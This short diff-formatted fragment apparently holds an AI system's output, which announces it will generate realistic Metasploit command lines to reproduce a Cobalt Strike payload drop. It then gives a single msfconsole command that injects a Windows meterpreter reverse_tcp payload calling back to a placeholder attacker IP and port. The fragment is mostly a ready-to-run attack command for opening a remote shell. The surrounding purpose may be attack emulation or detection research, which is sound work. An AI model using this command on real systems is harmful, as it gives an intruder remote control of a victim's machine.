@@ -1,0 +1,3 @@
+Based on the provided documentation and attack description, I will generate realistic command lines using only the Metasploit tool to reproduce the Cobalt Strike payload dropping a malicious payload onto the system.
+
+Command: `msfconsole -x "use exploit/windows/local/payload_inject; set PAYLOAD=windows/x64/meterpreter/reverse_tcp; set LHOST=<attacker_IP>; set LPORT=<attacker_port>; exploit"`
